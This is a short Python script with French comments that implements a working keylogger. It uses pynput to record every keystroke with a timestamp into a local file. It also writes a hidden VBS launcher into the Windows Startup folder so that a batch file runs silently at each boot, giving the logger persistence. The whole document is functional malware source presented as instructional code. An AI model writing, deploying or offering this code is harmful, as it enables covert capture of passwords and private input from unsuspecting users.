#listener basique et Key qui s utilisent ensemble 
#telecharger la bibliotheque pynput.keyboard au prealable
from pynput.keyboard import Key, Listener 
import logging #logging nous permet de configurer le format d'un fichier
import getpass # donne des infos sur l'utilisateur
import os

#initialisation
log_dir = ""
USER_NAME = getpass.getuser()
file_path = ""


#Demarrage automatique
if file_path == "":
	file_path = os.path.dirname(os.path.realpath(__file__))

#Ici bat_path est l'emplacement du dossier de demarrage (Startup folder)de Windows
#qui contient une liste de raccourcis de ces applications (fichier open.vbs)
#qui demarrent AUTOMATIQUEMENT au demarrage de Windows.
vbs_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
with open(vbs_path + '\\' + "open.vbs", "w+") as vbs_file:
	vbs_file.write("Set wshShell = CreateObject(\"wScript.Shell\")\n")
	vbs_file.write("wshShell.Run chr(34) & \"%s\FirstBoot.bat\" & chr(34), 0\n" % file_path)
	vbs_file.write("Set wshShell = Nothing")

# choix du fichier dans lequel on veut ecrire 
logging.basicConfig(filename=(log_dir + "key_log.txt"), 
# date suivie de la lettre lue
level=logging.DEBUG, format='%(asctime)s: %(message)s') 


# ces 4 lignes sont celles qui font la lecture et copie son contenu dans notre fichier
def on_press(key):
    logging.info(str(key)) 
with Listener(on_press=on_press) as listener:
    listener.join()


